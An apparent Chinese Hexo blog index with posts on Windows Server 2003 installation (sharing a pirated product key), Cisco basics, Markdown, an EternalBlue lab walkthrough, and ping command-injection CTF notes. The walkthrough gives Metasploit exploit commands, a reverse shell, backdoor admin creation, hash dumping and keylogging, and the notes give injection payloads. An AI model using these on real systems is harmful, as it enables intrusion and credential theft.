src="/2023/02/22/windows-server-2003/%E5%AE%89%E8%A3%851.png" class="" title="图片展示"><p>选择第一个<strong>Microsoft Windows（w）</strong>，下面选择你自己下载的镜像的版本，下载的企业版的话，和我一样就行</p><img src="/2023/02/22/windows-server-2003/%E5%AE%89%E8%A3%852.png" class="" title="图片展示"><p>名字我这是是默认的，安装路径，自己选取内存空间足的位置</p><img src="/2023/02/22/windows-server-2003/%E5%AE%89%E8%A3%853.png" class="" title="图片展示"><p>这里的最大磁盘大小，根据自己的需求定，他推荐的40GB其实已经够了，继续下一步</p><img src="/2023/02/22/windows-server-2003/%E5%AE%89%E8%A3%854.png" class="" title="图片展示"><p>点击<strong>自定义硬件</strong>，点击新<strong>CD&#x2F;DVD（IDE）</strong>，选择使用刚刚下载的iOS镜像</p><img src="/2023/02/22/windows-server-2003/%E5%AE%89%E8%A3%855.png" class="" title="图片展示"><img src="/2023/02/22/windows-server-2003/%E5%AE%89%E8%A3%856.png" class="" title="图片展示"><p>配置完成后，点击完成即可</p><img src="/2023/02/22/windows-server-2003/%E5%AE%89%E8%A3%857.png" class="" title="图片展示"><p>此时就会生成了你需要的虚拟机，点击开启虚拟机</p><img src="/2023/02/22/windows-server-2003/%E5%AE%89%E8%A3%858.png" class="" title="图片展示"><h2 id="三、系统安装"><a href="#三、系统安装" class="headerlink" title="三、系统安装"></a>三、系统安装</h2><p>开机之后，等待一会即会进入这个界面，按<strong>enter</strong>即可开始安装</p><img src="/2023/02/22/windows-server-2003/%E5%AE%89%E8%A3%859.png" class="" title="图片展示"><p>直接按<strong>F8</strong></p><img src="/2023/02/22/windows-server-2003/%E5%AE%89%E8%A3%8510.jpg" class="" title="图片展示"><p>按<strong>enter</strong>继续安装</p><img src="/2023/02/22/windows-server-2003/%E5%AE%89%E8%A3%8511.png" class="" title="图片展示"><p>选择<strong>用NTFS文件格式系统格式化磁盘分区</strong></p><img src="/2023/02/22/windows-server-2003/%E5%AE%89%E8%A3%8512.png" class="" title="图片展示"><p>一直等待即可，直到到了这里，继续安装，点击下一步</p><img src="/2023/02/22/windows-server-2003/%E5%AE%89%E8%A3%8513.png" class="" title="图片展示"><p>填完信息，继续下一步</p><img src="/2023/02/22/windows-server-2003/%E5%AE%89%E8%A3%8514.png" class="" title="图片展示"><p>这里需要产品密钥，我搞了好久，那些都被认证得差不多了，最终<strong>RYCR6-T7Y6M-2TVHK C2YW3-7TYQ8</strong>这个可以用</p><img src="/2023/02/22/windows-server-2003/%E5%AE%89%E8%A3%8515.png" class="" title="图片展示"><p>这里的服务器选择500，然后点击下一步</p><img src="/2023/02/22/windows-server-2003/%E5%AE%89%E8%A3%8516.png" class="" title="图片展示"><p>这里一定要记好自己的密码，重置很麻烦，用户名随意，然后点击下一步</p><img src="/2023/02/22/windows-server-2003/%E5%AE%89%E8%A3%8517.png" class="" title="图片展示"><p>继续下一步</p><img src="/2023/02/22/windows-server-2003/%E5%AE%89%E8%A3%8518.png" class="" title="图片展示"><p>等待一会，继续下一步</p><img src="/2023/02/22/windows-server-2003/%E5%AE%89%E8%A3%8519.png" class="" title="图片展示"><p>继续下一步</p><img src="/2023/02/22/windows-server-2003/%E5%AE%89%E8%A3%8520.png" class="" title="图片展示"><p>到这里就结束了，他自己会重启，然后根据要求Ctrl+alt+delete进入登录界面，输入刚刚设置的密码即可。</p>]]></content>
    
    
    <categories>
      
      <category>操作系统</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创：lingdu</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Cisco基础笔记——主页的认识</title>
    <link href="/2023/02/21/Cisco%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E4%B8%BB%E9%A1%B5%E7%9A%84%E8%AE%A4%E8%AF%86/"/>
    <url>/2023/02/21/Cisco%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E4%B8%BB%E9%A1%B5%E7%9A%84%E8%AE%A4%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<p>Cisco笔记合集</p><h1 id="Cisco基础笔记——主页的认识"><a href="#Cisco基础笔记——主页的认识" class="headerlink" title="Cisco基础笔记——主页的认识"></a>Cisco基础笔记——主页的认识</h1><h2 id="主界面介绍"><a href="#主界面介绍" class="headerlink" title="主界面介绍"></a>主界面介绍</h2><img src="/2023/02/21/Cisco%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E4%B8%BB%E9%A1%B5%E7%9A%84%E8%AE%A4%E8%AF%86/Cisco%E4%B8%BB%E9%A1%B5.png" class="" title="图片展示"><ol><li>菜单栏：从左到右分别是<strong>新建，打开，保存， 打印，网络信息，用户预制文件，活动向导，复制，粘贴，撤销，重做，放大，还原，缩小，调色板，自定义设备对话框</strong>….</li><li>常用工具栏：从左往右分别是<strong>选择，查看，删除，调整大小，备注，各种绘制图像的工具，添加简单的数据包，添加复杂的数据包</strong>。</li><li>逻辑和物理工作区转换栏：逻辑工作区为主要工作区，用户在此工作区完成网络设备的逻辑连接和配置。物理工作区为模拟真实情况有城市、建筑物、工作间等直观图，用户对此进行相关配置。</li><li>设备区：给用户提供不同类型不同型号的网络设备，包括路由器、交换机、集线器、PC端、各种线缆等等。</li><li>实时&#x2F;模拟模式转换栏：实时模式为默认模式，模拟模式有模拟数据包的传输过程，更好查看整个网络拓扑图。</li></ol><h2 id="Cisco设备介绍"><a href="#Cisco设备介绍" class="headerlink" title="Cisco设备介绍"></a>Cisco设备介绍</h2><img src="/2023/02/21/Cisco%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E4%B8%BB%E9%A1%B5%E7%9A%84%E8%AE%A4%E8%AF%86/%E5%B8%B8%E7%94%A8%E8%AE%BE%E5%A4%87.jpg" class="" title="图片展示"><ul><li>常用设备有<strong>路由，交换机，PC端，线缆，防火墙</strong>。</li></ul><img src="/2023/02/21/Cisco%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E4%B8%BB%E9%A1%B5%E7%9A%84%E8%AE%A4%E8%AF%86/%E5%B8%B8%E7%94%A8%E7%BA%BF%E7%BC%86.png" class="" title="图片展示"><ul><li><p>常用线缆介绍：从左往右分别为<strong>自动配置线，console线(通用线)，直连线，交叉线，光纤，电话线，同轴电缆，串口线  dce端，串口线 dte端，八爪线，自定义电缆，USB</strong>。</p></li><li><p>终端配置线(console):<br>提供用于通过计算机的超级终端来实现路由器、交换机的配置线缆。一头是Console接口，另一条头是RS 232接口</p></li><li><p>直通线使用范围：  </p><blockquote><p>计算机连接至集线器或交换机时<br>一台集线器或交换机以Up-Link短裤连接至另一台集线器或交换机的普通端口时<br>集线器或交换机与路由器的LAN端口连接时</p></blockquote></li><li><p>交叉线的使用范围：</p><blockquote><p>两台计算机通过网卡直接相连<br>以级联方式连接集线器或交换机的普通端口时<br>两个路由器通过以太网接口互联时<br>计算机广域网直接连接计算机时<br>相关网络设备连接交换机时</p></blockquote></li><li><p>光纤线缆：</p><blockquote><p> 连接快速以太网和吉比特以太网的光纤接口</p></blockquote></li><li><p>电话线：</p><blockquote><p>连接RJ-11接口，包括RJ-11接口的内置调制解调器、DSL Modem</p></blockquote></li></ul><h2 id="Cisco-几种模式介绍"><a href="#Cisco-几种模式介绍" class="headerlink" title="Cisco 几种模式介绍"></a>Cisco 几种模式介绍</h2><h2 id="Switch"><a href="#Switch" class="headerlink" title="Switch"></a>Switch</h2><img src="/2023/02/21/Cisco%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E4%B8%BB%E9%A1%B5%E7%9A%84%E8%AE%A4%E8%AF%86/Switch%E6%A8%A1%E5%BC%8F%E4%BB%8B%E7%BB%8D.png" class="" title="图片展示"><ol><li>Swicth&gt; 表示用户模式，可以对设备进行简单的查看</li><li>Switch# 表示特权模式，可以对设备进行全部的查看和简单的配置,使用<code>enable</code>或者<code>en</code>进入</li><li>Switch(config)# 表示全局配置模式 可以进一步对设备进行具体的配置，没有限制，使用<code>config terminal</code>进入。</li><li>Switch(config-if)# 表示接口模式，进入接口，对该接口进行具体的配置，例如：&#96;interface fa 0&#x2F;1</li></ol><h2 id="Router"><a href="#Router" class="headerlink" title="Router"></a>Router</h2><img src="/2023/02/21/Cisco%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E4%B8%BB%E9%A1%B5%E7%9A%84%E8%AE%A4%E8%AF%86/Router%E6%A8%A1%E5%BC%8F%E4%BB%8B%E7%BB%8D.png" class="" title="图片展示"><ol><li>Router&gt; 表示用户模式，可以对设备进行简单的查看</li><li>Router# 表示特权模式，可以对设备进行全部的查看和简单的配置，使用<code>enable</code>或者<code>en</code>进入</li><li>Router(config)# 表示全局配置模式，可以进一步的对设备进行具体的配置，没有限制，使用<code>config terminal</code>进入</li><li>Router(config-if)# 表示接口模式，进入接口，对该接口进行具体的配置，例如：<code>interface g 0/0</code></li></ol><h3 id="小提示"><a href="#小提示" class="headerlink" title="小提示"></a>小提示</h3><img src="/2023/02/21/Cisco%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E4%B8%BB%E9%A1%B5%E7%9A%84%E8%AE%A4%E8%AF%86/CTL%E7%95%8C%E9%9D%A2.png" class="" title="图片展示"><blockquote><p>在CTL界面输入<code>？</code>可以查看命令</p><p>在敲命令的时候熟练是用tab键（补全命令）可以更高效的配置哦</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Cisco</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创：lingdu</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>永恒之蓝</title>
    <link href="/2023/02/21/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/"/>
    <url>/2023/02/21/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/</url>
    
    <content type="html"><![CDATA[<p>windows7 - 永恒之蓝漏洞复现</p><h1 id="windows7-永恒之蓝漏洞复现"><a href="#windows7-永恒之蓝漏洞复现" class="headerlink" title="windows7 - 永恒之蓝漏洞复现"></a>windows7 - 永恒之蓝漏洞复现</h1><h2 id="操作教程"><a href="#操作教程" class="headerlink" title="操作教程"></a>操作教程</h2><h3 id="windows-7-永恒之蓝漏洞复现"><a href="#windows-7-永恒之蓝漏洞复现" class="headerlink" title="windows 7 - 永恒之蓝漏洞复现"></a>windows 7 - 永恒之蓝漏洞复现</h3><ul><li><p>查询俩机的ip地址</p><table><thead><tr><th></th><th>kail</th><th>windows7</th></tr></thead><tbody><tr><td>ip</td><td>192.168.136.138</td><td>192.168.136.137</td></tr></tbody></table></li><li><p>首先检查windows7的靶机是否脆弱.<br>脆弱</p><blockquote><p>此处一般是kail攻击远程连接不成功的排查点<br> 1.靶机防火墙是否关闭<br>    <img src="/2023/02/21/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/2.png" class="" title="图片展示"><br> 2.通过控制面板的系统与安全中远程控制是否打开<br>    <img src="/2023/02/21/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/1.png" class="" title="图片展示"><br>3.检查系统补丁是否更新，如果有系统安全补丁将其卸载，（如果不确定的话，选择无脑全部卸载）<br>    <img src="/2023/02/21/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/3.png" class="" title="图片展示"></p></blockquote></li><li><p>通过使用nmap扫描虚拟机查看开启状态和其他信息,查看ip后发现端口处于开启状态</p><img src="/2023/02/21/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/4.png" class="" title="图片展示"><img src="/2023/02/21/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/5.png" class="" title="图片展示"></li><li><p>使用kail与window7进行ping网段，查看是否有数据连通</p><img src="/2023/02/21/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/6.png" class="" title="图片展示"></li><li><p>ping通后，打开kail的数据库,使用以下指令。</p><ul><li>service postgresql status &#x2F;&#x2F;查看数据库开启状态</li><li>service postgresql start &#x2F;&#x2F;开启数据库</li><li>service postgresql status &#x2F;&#x2F;再次查看数据库开启状态，确认开启<img src="/2023/02/21/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/7.png" class="" title="图片展示"></li></ul></li><li><p>将数据库进行初始化</p><ul><li>msfdb init<img src="/2023/02/21/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/8.png" class="" title="图片展示"></li></ul></li><li><p>启动msfconsole</p><blockquote><p>msfconsole 简称 msf 是一款常用的安全测试工具，包含了常见的漏洞利用模块和生成各种木马，其提供了一个一体化的集中控制台，通过msfconsole，你可以访问和使用所有的metaslopit插件，payload，利用模块，post模块等等。msfconsole还有第三方程序的接口，比如nmap、sqlmap等，可以直接在msfconsole里面使用。</p></blockquote><img src="/2023/02/21/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/9.png" class="" title="图片展示"></li><li><p>搜索ms17_010漏洞(永恒之蓝漏洞)</p><ul><li>search ms17_010<img src="/2023/02/21/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/10.png" class="" title="图片展示"></li></ul></li><li><p>选择扫描模块，进行探测是否成功</p><blockquote><p>use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010</p></blockquote><img src="/2023/02/21/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/11.png" class="" title="图片展示"></li><li><p>查看要设置的参数</p><blockquote><p>show options</p></blockquote><img src="/2023/02/21/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/12.png" class="" title="图片展示"></li><li><ul><li>首先运行查看是否运行，如果不能运行就需要进行设置<img src="/2023/02/21/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/13.png" class="" title="图片展示"></li></ul></li><li><p>此时需要进行设置rhosts与rport参数</p><ul><li>rhosts(靶机ip) rport(端口号)<img src="/2023/02/21/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/14.png" class="" title="图片展示"></li></ul></li><li><p>验证存在漏洞之后，就可以利用永恒之蓝漏洞，使用其中的渗透攻击（exploit）模块，对其进行渗透攻击 选择模块exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue 配置模块 发动攻击</p><blockquote><p>use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue</p></blockquote><ul><li>首先options查看参数<img src="/2023/02/21/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/15.png" class="" title="图片展示"><img src="/2023/02/21/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/16.png" class="" title="图片展示"></li></ul><blockquote><p>  &#x2F;&#x2F;设置扫描的靶机ip<br>    set rhost 192.168.136.137<br>    &#x2F;&#x2F;设置携带的攻击载荷<br>    set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp<br>    &#x2F;&#x2F;设置监听的攻击机<br>    set lhost 192.168.136.138</p></blockquote><img src="/2023/02/21/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/17.png" class="" title="图片展示"></li><li><p>最后启动利用exploit进行攻击,成功渗透</p><img src="/2023/02/21/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/18.png" class="" title="图片展示"></li><li><p>渗透成功后一些常用操作<br>通过Shell对靶机Win7进行控制<br>创建用户名密码<br>net user hack 123456 &#x2F;add<br>将用户hack添加入管理组<br>net localgroup administrators hack &#x2F;add<br>开启远程桌面功能<br>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f<br>Kali远程桌面连接Win7<br>rdesktop 192.168.2.22<br>————————————————</p></li><li><p>当利用渗透后的权限进行shell交互显示乱码是因为编码不同,以下指令即可实现</p><blockquote><p>chcp 65001</p></blockquote></li><li><p>获取到session后的常用命令：</p><p>help #获取所有可用命令</p><p>getuid #获取当前权限</p><p>screenshot #截屏</p><p>hashdump #获取密码的hash</p><p>ps #获取进程列表</p><p>sysinfo #获取系统信息</p><p>route #获取路由表</p><p>getpid #获取当前攻入的进程pid</p><p>migrate #将当前后门注入迁移到其他程序</p><p>keyscan_start # 开启键盘记录</p><p>keyscan_dump #显示键盘记录 使用永恒之蓝攻入的session默认不能进行键盘记录 ，如果迁移到其他程序就可以做，比如notepad.exe</p><p>download&#x2F;upload #上传下载文件</p><p>keyscan_stop # 监视键盘记录</p><p>bg # 回到metasploit界面</p><p>令牌操纵<br>use incognito #heip incognito 查看帮助</p><p>list_tokens -u 查看可用的token</p><p>impersonate_token “伪造的身份” #假冒token 或者</p><p>举个例子：impersonate_token NT AUTHORITY\SYSTEM #不加单引号 需使用<br>execute -f cmd.exe -i –t # -t 使用假冒的token 执行 或者直接shell</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创：小新</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>md文档</title>
    <link href="/2023/02/21/%E7%AC%94%E8%AE%B0/"/>
    <url>/2023/02/21/%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>md文档</p><h1 id="一-标题"><a href="#一-标题" class="headerlink" title="一 标题"></a>一 标题</h1><p><a href="#%E5%8D%81-%E9%94%9A%E7%82%B9">底部</a></p><p><a href="#%E4%B8%83-%E5%9B%BE%E7%89%87">图片</a></p><h2 id="1-主标题"><a href="#1-主标题" class="headerlink" title="1.主标题"></a>1.主标题</h2><ul><li>用三个‘&#x3D;’等号表示</li></ul><h2 id="2-副标题"><a href="#2-副标题" class="headerlink" title="2.副标题"></a>2.副标题</h2><ul><li>用三个‘—’减号表示</li></ul><h2 id="3-多级标题"><a href="#3-多级标题" class="headerlink" title="3.多级标题"></a>3.多级标题</h2><ul><li>#一级标题</li><li>##二级标题</li><li>###三级标题</li><li>####四级标题</li><li>(‘#’后要加空格)</li></ul><hr><h1 id="二-列表"><a href="#二-列表" class="headerlink" title="二 列表"></a>二 列表</h1><h2 id="两大类"><a href="#两大类" class="headerlink" title="两大类"></a>两大类</h2><ul><li><p>有序列表：需要数据编号</p></li><li><p>无序列表：用符号’-‘.’+’.’*’ 任意一个都可以</p></li><li><p>列表嵌套不分有序无序</p></li></ul><hr><h1 id="三-表格"><a href="#三-表格" class="headerlink" title="三 表格"></a>三 表格</h1><p>表格书写格式设计以及对齐方式</p><table><thead><tr><th align="center">名字</th><th align="center">性别</th><th align="center">年龄</th></tr></thead><tbody><tr><td align="center">王</td><td align="center">男</td><td align="center">19</td></tr><tr><td align="center">傅</td><td align="center">女</td><td align="center">19</td></tr></tbody></table><ul><li>|:—:|:—:|:—:| &lt;-中心对齐</li><li>|—:|—:|—:|    &lt;-右对齐</li></ul><hr><h1 id="四-分割线"><a href="#四-分割线" class="headerlink" title="四 分割线"></a>四 分割线</h1><h2 id="6种模式"><a href="#6种模式" class="headerlink" title="6种模式"></a>6种模式</h2><ul><li><p>三个’<em>‘号表示方式:</em>**  * * *</p></li><li><p>同上分别有’—‘  ‘_’</p><pre><code class="hljs">  注意：分割线的符号需要与内容隔开一行，否 者分割线编辑器解析有问题</code></pre></li></ul><hr><h1 id="五-字体"><a href="#五-字体" class="headerlink" title="五 字体"></a>五 字体</h1><ol><li>斜体表示：[_ 内容 _ ] [* 内容*]</li></ol><p><em>一个不稳 可以用下划线、星号，一边一个</em></p><ol start="2"><li>粗体表示：[__ 内容 __]  [** 内容**]</li></ol><p><strong>两个胖 可以用下划线、星号、静号，一边两个</strong></p><ol start="3"><li>又粗又斜：[___ 内容___] [*** 内容***]</li></ol><p><em><strong>三个不稳又胖</strong></em></p><hr><h1 id="六-超链接"><a href="#六-超链接" class="headerlink" title="六 超链接"></a>六 超链接</h1><p>分为：</p><ol><li>内容超链接<ul><li>格式 【内容】(链接)</li><li><a href="https://www.baidu.com/">点击去度娘</a></li><li><a href="http://weavesilk.com/">好玩的网址</a></li></ul></li><li>直链超链接<ul><li>直接写链接</li><li><a href="https://www.baidu.com/">https://www.baidu.com/</a></li><li><a href="http://weavesilk.com/">http://weavesilk.com</a></li></ul></li></ol><h1 id="七-图片"><a href="#七-图片" class="headerlink" title="七 图片"></a>七 图片</h1><p>分为：</p><ol><li><p>网络图片<br> <img src="https://img.zcool.cn/community/01d4795e02dc6da801216518234523.jpg@1280w_1l_2o_100sh.jpg" alt="alt图片内容" title="小狗"></p><ul><li>alt内容：图片失效时显示的内容</li><li>图片地址：图片的网址或者位置</li><li>title内容：鼠标放在图片上显示的文字</li></ul></li><li><p>本地图片<br> <img src="/./%E5%9B%BE%E7%89%87.png" alt="alt图片内容"></p><p> <img src="/./%E5%9B%BE%E7%89%871.png" alt="alt图片内容"></p><ul><li>不一样在（.&#x2F;图片地址）</li></ul></li></ol><h1 id="八-代码块"><a href="#八-代码块" class="headerlink" title="八 代码块"></a>八 代码块</h1><p>分为:</p><ol><li><p>单行代码块：</p><pre><code class="hljs"> const user = &#39;southwind!;&#39;</code></pre></li></ol><hr><ol start="2"><li><p>多行代码块：</p><ul><li>定义一个python函数</li></ul> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">user</span>(<span class="hljs-params">sex</span>)<br>    <span class="hljs-keyword">return</span> sex<br></code></pre></td></tr></table></figure></li></ol><hr><h1 id="九-内容引入"><a href="#九-内容引入" class="headerlink" title="九 内容引入"></a>九 内容引入</h1><p>应用其他人的话，做标记</p><ul><li>谁说的话的面前加”&gt;”</li></ul><p>羽生结弦：</p><blockquote><p>努力会说谎，但努力不会白费</p></blockquote><hr><h1 id="十-锚点"><a href="#十-锚点" class="headerlink" title="十 锚点"></a>十 锚点</h1><p>定位文章使用的</p><p>【内容】(‘#’号加标题提示)</p><p><a href="#%E4%B8%80-%E6%A0%87%E9%A2%98">返回顶部</a></p><p><a href="#%E4%BA%8C-%E5%88%97%E8%A1%A8">二.列表</a></p>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创：双生花</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ping</title>
    <link href="/2023/02/20/ping/"/>
    <url>/2023/02/20/ping/</url>
    
    <content type="html"><![CDATA[<p>ping命令在web题中的实训</p><h1 id="ping命令在web题中的实训"><a href="#ping命令在web题中的实训" class="headerlink" title="ping命令在web题中的实训"></a>ping命令在web题中的实训</h1><h2 id="ping命令的介绍"><a href="#ping命令的介绍" class="headerlink" title="ping命令的介绍"></a>ping命令的介绍</h2><p>ping，因特网包探索器，用于测试网络连接器的程序。<br>ping是工作在TCP&#x2F;IP网络体系结构中应用层的一个服务命令，主要是向特定的目的主机发送ICMP（因特网报文控制协议）Echo请求报文，测试目的站是否可达及了解其有关状态。</p><h2 id="检测是否可以注入"><a href="#检测是否可以注入" class="headerlink" title="检测是否可以注入"></a>检测是否可以注入</h2><p>传入参数127.0.0.1;whoami,如果存在注入的话，得到的结果是“www-data”。</p><h2 id="在web中ping题目常用过滤字符"><a href="#在web中ping题目常用过滤字符" class="headerlink" title="在web中ping题目常用过滤字符"></a>在web中ping题目常用过滤字符</h2><p>‘$’、’;’、’|’、’-‘、’(‘、’)’、’反引号’、’||’、’&amp;&amp;’、’&amp;’、’{‘、’}’</p><h2 id="ls访问目录"><a href="#ls访问目录" class="headerlink" title="ls访问目录"></a>ls访问目录</h2><p>可以直接传参127.0.0.1;ls,需要解决过滤的话就是127.0.0.1;a&#x3D;’l’;b&#x3D;’s’;c&#x3D;$a$b;$c(c这一块可能需要用出引号包裹起来)。</p><h2 id="尝试寻找flag文件"><a href="#尝试寻找flag文件" class="headerlink" title="尝试寻找flag文件"></a>尝试寻找flag文件</h2><p>127.0.0.1 &amp;&amp;find &#x2F; -name “flag*”</p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创：lingdu</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
